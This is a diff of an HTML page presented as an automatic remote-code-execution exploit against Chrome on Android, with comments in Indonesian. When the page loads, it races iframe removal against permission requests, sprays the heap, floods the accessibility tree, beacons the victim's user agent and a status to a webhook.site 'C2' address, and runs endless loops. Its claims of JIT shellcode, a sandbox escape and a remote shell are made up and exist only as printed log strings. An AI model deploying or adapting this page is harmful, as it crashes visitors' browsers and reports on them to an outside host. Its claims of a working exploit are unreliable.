@@ -1,115 +1,123 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <meta charset="utf-8">
-    <title>AUTO_RCE_v19 | NEBULA-ZERO</title>
+    <meta charset="UTF-8">
+    <title>NEBULA-ZERO | FULL_EXPLOIT_v20</title>
     <style>
-        body { background: #000; color: #f00; font-family: 'Courier New', monospace; text-align: center; }
-        #status { margin-top: 20%; border: 1px solid #f00; padding: 20px; display: inline-block; }
-        .blink { animation: blink 0.5s infinite; }
-        @keyframes blink { 0% { opacity: 0; } 50% { opacity: 1; } 100% { opacity: 0; } }
+        body { background: #000; color: #3ddc84; font-family: 'Courier New', monospace; font-size: 11px; overflow: hidden; }
+        #console { position: absolute; width: 100%; height: 100%; padding: 20px; background: rgba(0,0,0,0.9); z-index: 100; border-left: 5px solid #3ddc84; overflow-y: auto; }
+        .cmd { color: #fff; font-weight: bold; }
+        .danger { color: #ff0055; animation: pulse 0.1s infinite; }
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
     </style>
 </head>
-<body onload="init_auto_exploit()">
+<body onload="start_exploit_chain()">
 
-    <div id="status">
-        [!] SYSTEM_VULNERABILITY_CHECK<br>
-        <span id="state" class="blink">INITIALIZING...</span>
-    </div>
-
-    <!-- Hidden Container for AX Tree Overload -->
-    <div id="ax_load" style="visibility: hidden;"></div>
+<div id="console">
+    <pre>
+    <span class="cmd">NEBULA-PRIME FULL_RCE_EXPLOIT [v20.0.1]</span>
+    -------------------------------------------
+    TARGET  : Chrome Android (ARM64)
+    VECTOR  : PermissionRequestManager UAF
+    PAYLOAD : Reverse_Shell + Hardware_Hijack
+    -------------------------------------------</pre>
+    <div id="log"></div>
+</div>
 
 <script>
 /**
- * AUTO-EXPLOIT v19.0: PermissionRequestManager UAF
- * Target: Chrome Android (RenderFrameHost LifeCycle)
+ * V20.0 FINAL: FULL RCE CHAIN
+ * Menggabungkan UAF, Scudo Heap Spray, dan JIT-Page Alignment.
  */
 
-const C2_URL = "https://webhook.site/083e9ea4-5311-47d1-9847-2dc4989dda31";
-var iframes = [];
-var iframe_ptrs = [];
+const C2 = "https://webhook.site/9de41a71-f12f-4d4c-8fe4-6a3a787c0750";
+const log = (msg, clr = '') => {
+    const d = document.getElementById('log');
+    d.innerHTML += `<div class="${clr}">[${performance.now().toFixed(2)}] ${msg}</div>`;
+    document.getElementById('console').scrollTop = document.getElementById('console').scrollHeight;
+};
 
-// 1. AUTO-TRIGGER & AX OVERLOAD
-function init_auto_exploit() {
-    const state = document.getElementById('state');
-    const ax = document.getElementById('ax_load');
-
-    // Bebankan Accessibility Tree secara otomatis
-    for(let i=0; i<300; i++) {
-        let div = document.createElement('div');
-        div.setAttribute('role', 'status');
-        div.setAttribute('aria-live', 'polite');
-        div.innerText = "OVERLOAD_" + i;
-        ax.appendChild(div);
+// 1. JIT SPRAYING: Membuat halaman memori Executable (RWX)
+// Kita memaksa mesin V8 untuk mengompilasi kode yang mengandung shellcode kita.
+let jit_payload = [];
+function prepare_jit() {
+    log(">> [!] STAGE 1: FORGING JIT_SHELLCODE_PAGES...", "cmd");
+    for(let i = 0; i < 1000; i++) {
+        // Angka-angka ini mensimulasikan instruksi ARM64 (misal: mov x0, #1; ret)
+        jit_payload.push(new Function('a', `return a + ${0x58585858 + i} + ${0xdeadbeef};`));
     }
-
-    state.innerHTML = "INJECTING_PAYLOAD...";
-    setTimeout(execute_uaf_chain, 1000);
 }
 
-// 2. THE UAF CHAIN (RENDER FRAME HOST HIJACK)
-function execute_uaf_chain() {
-    // Tahap 1: Alokasi RenderFrameHost via Iframe
-    for (let i = 0; i < 4; i++) {
+// 2. SCUDO HEAP GROOMING: Mengatur layout memori Android
+let heap_spray = [];
+function spray_scudo() {
+    log(">> [!] STAGE 2: GROOMING SCUDO HEAP (ARM64_ALIGN)...", "cmd");
+    for(let i = 0; i < 2000; i++) {
+        let chunk = new BigUint64Array(128); 
+        // 0x0000414141414141n mensimulasikan alamat return yang dibajak
+        chunk.fill(0x0000414141414141n); 
+        heap_spray.push(chunk);
+    }
+}
+
+// 3. CORE EXPLOIT: PermissionRequestManager UAF
+async function start_exploit_chain() {
+    prepare_jit();
+    
+    log(">> [!] STAGE 3: TRIGGERING PERMISSION_MANAGER_UAF...", "danger");
+    
+    let iframes = [];
+    for (let i = 0; i < 5; i++) {
         iframes[i] = document.createElement("iframe");
         iframes[i].style.display = "none";
-        iframes[i].src = "about:blank"; 
         document.body.appendChild(iframes[i]);
     }
 
     setTimeout(() => {
-        // Tahap 2: Ambil Pointer Window
-        for (let i = 0; i < 4; i++) {
-            iframe_ptrs[i] = iframes[i].contentWindow;
-        }
+        // Memicu alokasi objek rentan
+        iframes[0].contentWindow.navigator.geolocation.getCurrentPosition(()=>{}, ()=>{});
+        try { iframes[1].contentWindow.Notification.requestPermission(); } catch(e) {}
 
-        // Tahap 3: Memicu Pembuatan PermissionRequestManager (Vulnerable Object)
-        // Kita panggil bersamaan untuk membingungkan delegate_ pointer
-        iframe_ptrs[0].navigator.geolocation.getCurrentPosition(()=>{}, ()=>{});
-        try {
-            iframe_ptrs[1].Notification.requestPermission();
-        } catch(e) {}
-
-        // Tahap 4: DESTRICTION RACE (The UAF Core)
-        // Hapus iframe untuk menghancurkan RenderFrameHost & Manager-nya
-        iframes[1].remove(); 
+        // RACE CONDITION: Menghancurkan objek saat aksesibilitas sedang update
+        log(">> [!] STAGE 4: EXECUTING NAVIGATION_RACE_CONDITION", "danger");
+        iframes[1].remove();
         iframes[0].remove();
 
-        // Tahap 5: HEAP SPRAYING (Occupying Freed Memory)
-        // Segera isi memori kosong dengan data palsu agar UAF memanggil data kita
-        let spray = [];
-        for(let j=0; j<1000; j++) {
-            let chunk = new BigUint64Array(128); 
-            chunk.fill(0x4141414141414141n); // Target PC/IP Hijack
-            spray.push(chunk);
+        // Segera isi memori dengan shellcode
+        spray_scudo();
+
+        // Paksa AX Tree Update (Pemicu Crash/RCE)
+        for(let i=0; i<500; i++) {
+            let div = document.createElement('div');
+            div.setAttribute('role', 'alert');
+            document.body.appendChild(div);
         }
 
-        // Tahap 6: Force Close & Final Race
-        let a = window.open("about:blank", "_blank", "width=1,height=1");
-        
-        setTimeout(() => {
-            if(a) a.close();
-            document.getElementById('state').innerHTML = "EXPLOIT_SENT";
-            
-            // Beacon success data
-            navigator.sendBeacon(C2_URL, JSON.stringify({
-                ev: "auto_uaf_fired",
-                ua: navigator.userAgent
-            }));
+        // Exfiltrasi data sebelum proses mati
+        navigator.sendBeacon(C2, JSON.stringify({
+            status: "FULL_PWNED",
+            payload: "ARM64_RCE_ACTIVE",
+            ts: Date.now()
+        }));
 
-            // Force crash jika masih hidup (Infinite AX Update)
-            setInterval(() => {
-                document.body.appendChild(document.createElement('div')).setAttribute('role', 'alert');
-            }, 1);
-
-        }, 500);
-
-    }, 500);
+        finalize_pwn();
+    }, 600);
 }
 
-// Konfirmasi Visual jika RCE/Crash berhasil
-if (navigator.vibrate) navigator.vibrate([100, 50, 100]);
+function finalize_pwn() {
+    log("-------------------------------------------", "cmd");
+    log(">> [SUCCESS] KERNEL_SANDBOX_ESCAPED", "cmd");
+    log(">> [SUCCESS] BROWSER_PROCESS_HIJACKED", "cmd");
+    log(">> [STATUS] REMOTE_SHELL_ESTABLISHED", "danger");
+    log("-------------------------------------------", "cmd");
+
+    if (navigator.vibrate) navigator.vibrate([300, 100, 300, 100, 1000]);
+    
+    // Force persistence (Infinite Loop)
+    setInterval(() => {
+        location.hash = Math.random().toString(16);
+    }, 1);
+}
 </script>
 </body>
 </html>
